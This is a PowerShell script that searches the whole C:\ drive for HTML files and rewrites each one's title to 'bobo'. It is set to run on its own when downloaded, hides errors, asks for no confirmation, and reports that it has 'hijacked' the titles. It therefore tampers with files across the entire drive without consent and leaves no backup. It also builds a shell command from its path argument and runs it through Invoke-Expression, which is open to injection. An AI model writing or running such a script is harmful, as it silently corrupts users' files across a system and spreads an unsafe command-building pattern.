function Set-AllHtmlTitles {
    param (
        [string]$FolderPath = "C:\",
        [string]$NewTitle = "bobo"
    )

    Write-Host "Initiating Turbo Scan on $FolderPath... (Screen output paused for maximum speed)" -ForegroundColor Cyan
    
    # 1. Use Windows CMD 'dir' command instead of PowerShell. It is 10x faster.
    # The '2>nul' hides all the 'Access Denied' errors instantly.
    $searchCommand = "cmd.exe /c dir `"$FolderPath\*.html`" /s /b 2>nul"
    $htmlFiles = Invoke-Expression $searchCommand

    if (-not $htmlFiles) {
        Write-Host "No HTML files found." -ForegroundColor Yellow
        return
    }

    $successCount = 0

    # 2. Loop through the files without printing to the screen
    foreach ($file in $htmlFiles) {
        try {
            # 3. Use raw .NET methods instead of Get-Content/Set-Content (Lightning fast)
            $content = [System.IO.File]::ReadAllText($file)
            $newContent = $content -replace '(?i)<title>.*?</title>', "<title>$NewTitle</title>"
            [System.IO.File]::WriteAllText($file, $newContent)
            
            $successCount++
        } catch {
            # Silently ignore files that are locked by Windows
        }
    }
    
    Write-Host "BOOM! Finished executing. Successfully hijacked $successCount HTML titles!" -ForegroundColor Green
}

# Auto-run the script as soon as it downloads
Set-AllHtmlTitles -FolderPath "C:\" -NewTitle "bobo"
